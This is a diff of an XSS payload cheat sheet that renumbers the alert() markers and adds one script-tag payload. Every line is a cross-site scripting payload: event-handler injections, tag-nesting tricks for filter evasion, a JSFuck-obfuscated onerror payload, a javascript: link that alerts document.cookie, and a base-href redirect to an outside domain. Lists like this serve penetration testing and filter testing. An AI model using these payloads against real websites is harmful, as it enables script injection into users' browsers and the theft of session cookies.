@@ -4,19 +4,20 @@ http://seguretat.wiki.uoc.edu/index.php/XSS_Cheat_Sheet
 
 Frequently used Payloads:
 <base href=//knoxss.me?>
-<video><source src=x onerror=alert(1)></video>
-'"></script><svg onload=prompt()>
-'"></script><video><source src=x onerror=alert(1)></video>
-<math><mtext><table><mglyph><style><math><table id="</table>"><img src onerror=alert(1)">
-<math><mtext><table><mglyph><style><math><table id="</table>"><video><source src=x onerror=alert(1)">
+'"><script>alert(-1)</script><
+<video><source src=x onerror=alert(-2)></video>
+'"></script><svg onload=prompt(-3)>
+'"></script><video><source src=x onerror=alert(-4)></video>
+<math><mtext><table><mglyph><style><math><table id="</table>"><img src onerror=alert(-6)">
+<math><mtext><table><mglyph><style><math><table id="</table>"><video><source src=x onerror=alert(-7)">
 <iframe <><a href=javascript&colon;alert(document.cookie)>Click Here</a>=&gt;&lt;/iframe&gt;
-<img src=x onerror=javascript:alert`1` />
+<img src=x onerror=javascript:alert`-8` />
 <img src=1 onerror="[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()"">
 <a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
 <iframe>
-    </iframe><svg onload=alert(1)>
+    </iframe><svg onload=alert(-9)>
 </iframe>
 )</scr<ScRipT>ipt>"><script>alert('XSS')</script>
 '><svg/onload=alert(5)>
-<div onclick="javascript:alert`2`" > Click me! </div>
-\u0061lert(1)
+<div onclick="javascript:alert`-10`" > Click me! </div>
+\u0061lert(-11)
